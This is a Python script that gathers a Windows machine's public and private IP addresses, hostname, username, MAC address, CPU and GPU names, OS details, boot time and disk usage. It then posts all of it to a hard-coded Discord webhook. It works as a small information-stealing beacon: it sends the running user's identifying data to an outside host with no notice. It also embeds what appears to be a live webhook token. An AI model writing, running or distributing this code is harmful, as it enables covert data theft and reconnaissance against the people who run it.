import socket
import platform
from requests import get
import requests
import subprocess
import psutil
from datetime import datetime
import getpass
from uuid import getnode as get_mac
import shutil

def create_webhook():
    return 'https://discord.com/api/webhooks/1179897294024360089/UIdyF0OYWNEbnMM4slmmJFyi67j8ritXSdqExYjT2tRyYUWn1MAh3-MK0Msr3UEZ5s7Q'

def send_to_discord(message):
    webhook_url = create_webhook()
    data = {
        "embeds": [{
            "title": "System Information",
            "description": message,
            "color": 15744527  # Jaune
        }]
    }
    headers = {'Content-Type': 'application/json'}
    requests.post(webhook_url, json=data, headers=headers)

def get_public_ip():
    try:
        public_ip = get("https://api.ipify.org").text
        return public_ip
    except Exception as e:
        print(f"Couldn't get Public IP Address: {e}")
        return "N/A"

def get_cpu_name():
    try:
        output = subprocess.check_output(["wmic", "cpu", "get", "name"]).decode().strip()
        lines = output.split('\n')
        cpu_name = lines[1]
        return cpu_name
    except Exception as e:
        print(f"Erreur lors de la récupération du nom du processeur : {e}")
        return "N/A"

def get_gpu_name():
    try:
        output = subprocess.check_output(["wmic", "path", "win32_VideoController", "get", "name"]).decode().strip()
        lines = output.split('\n')
        gpu_name = lines[1]
        return gpu_name
    except Exception as e:
        print(f"Erreur lors de la récupération du nom du GPU : {e}")
        return "N/A"

def computer_information():
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    public_ip = get_public_ip()
    os_info = platform.uname()
    username = getpass.getuser()
    boot_time = datetime.fromtimestamp(psutil.boot_time())
    mac = ':'.join(("%012X" % get_mac())[i:i + 2] for i in range(0, 12, 2))
    cpu_name = get_cpu_name()
    gpu_name = get_gpu_name()

    message = f"**Public IP Address:** {public_ip}\n" \
              f"\n**Private IP Address:** {IPAddr}\n" \
              f"\n**Hostname:** {hostname}\n" \
              f"\n**Processor:** {cpu_name}\n" \
              f"\n**GPU:** {gpu_name}\n" \
              f"\n**System:** {os_info}\n" \
              f"\n**Username:** {username}\n" \
              f"\n**MAC:** {mac}\n" \
              f"\n**Boot time:** {boot_time}\n"

    return message

def get_disk_info():
    partitions = psutil.disk_partitions()
    disk_info = {}
    for partition in partitions:
        disk_mountpoint = partition.mountpoint
        disk_usage = shutil.disk_usage(disk_mountpoint)
        total_size_gb = disk_usage.total // (2**30)
        free_size_gb = disk_usage.free // (2**30)
        used_size_gb = disk_usage.used // (2**30)
        used_percent = (disk_usage.used / disk_usage.total) * 100
        disk_info[disk_mountpoint] = (partition.device, total_size_gb, free_size_gb, used_size_gb, used_percent)
    return disk_info

def send_disk_info():
    disk_info = get_disk_info()
    disk_message = ""
    for disk_mountpoint, (disk_name, total_size_gb, free_size_gb, used_size_gb, used_percent) in disk_info.items():
        disk_message += f"**Disk Mountpoint:** {disk_mountpoint}\n" \
                        f"**Total Size:** {total_size_gb} GB\n" \
                        f"**Free Size:** {free_size_gb} GB\n" \
                        f"**Used Size:** {used_size_gb} GB\n" \
                        f"**Used Percent:** {used_percent:.2f}%\n\n"
    return disk_message
    
if __name__ == "__main__":
    system_info = computer_information()
    disk_info = send_disk_info()
    send_to_discord(system_info)
    send_to_discord(disk_info)
